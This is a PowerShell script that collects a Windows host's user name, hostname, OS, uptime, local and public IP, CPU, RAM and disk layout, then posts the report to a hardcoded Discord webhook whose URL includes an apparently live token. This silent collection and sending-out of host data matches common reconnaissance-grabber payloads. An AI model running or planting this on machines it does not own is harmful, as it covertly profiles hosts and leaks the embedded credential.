# ⚠ Replace with your actual webhook
$webhook = "https://discord.com/api/webhooks/1378469296560275627/cNZ6YLDw4yo1KxjAn3ih__dN-rwIyKCwSysM_LuPxrKzqdbJ6mPTkvGP1IJ-6NQjgXUg"

# Helper: format size
function Format-GB($bytes) {
    return "{0:N2} GB" -f ($bytes / 1GB)
}

# Public IP
$publicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()

# Local IP
$localIP = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } |
    Select-Object -First 1 -ExpandProperty IPAddress)

# Host and User
$hostname = $env:COMPUTERNAME
$user = $env:USERNAME

# OS Info
$os = (Get-CimInstance Win32_OperatingSystem)
$osName = $os.Caption
$osVer = $os.Version
$uptime = ((Get-Date) - $os.LastBootUpTime).ToString("dd\.hh\:mm\:ss")

# CPU and RAM
$cpu = (Get-CimInstance Win32_Processor)[0].Name
$ramTotal = Format-GB ($os.TotalVisibleMemorySize * 1KB)

# Disk Layout (like `lsblk`)
$disks = Get-Disk | Sort-Object Number
$partitions = Get-Partition
$volumes = Get-Volume

$diskInfo = ""
foreach ($disk in $disks) {
    $diskNum = $disk.Number
    $diskName = $disk.FriendlyName
    $diskSize = Format-GB $disk.Size
    $diskInfo += "Disk $diskNum - $diskName ($diskSize)`n"

    $diskParts = $partitions | Where-Object { $_.DiskNumber -eq $diskNum } | Sort-Object PartitionNumber

    foreach ($part in $diskParts) {
        $partNum = $part.PartitionNumber
        $drive = if ($part.DriveLetter) { "$($part.DriveLetter):" } else { "-" }
        $size = Format-GB $part.Size
        $type = $part.Type
        $volLabel = ($volumes | Where-Object { $_.DriveLetter -eq $part.DriveLetter }).FileSystemLabel

        $labelDisplay = if ($volLabel) { " [$volLabel]" } else { "" }

        $diskInfo += " └─ Partition $partNum ($drive, $type, $size)$labelDisplay`n"
    }
}

# Build message
$message = @"
🖥️ System Info Report

👤 User: $user
💻 Hostname: $hostname
🪟 OS: $osName ($osVer)
⏱️ Uptime: $uptime

🌐 Local IP: $localIP
📡 Public IP: $publicIP

🧠 CPU: $cpu
💾 RAM: $ramTotal

🗂 Disks:
$diskInfo
"@

# Send
$payload = @{ content = $message }
Invoke-RestMethod -Uri $webhook -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType 'application/json'

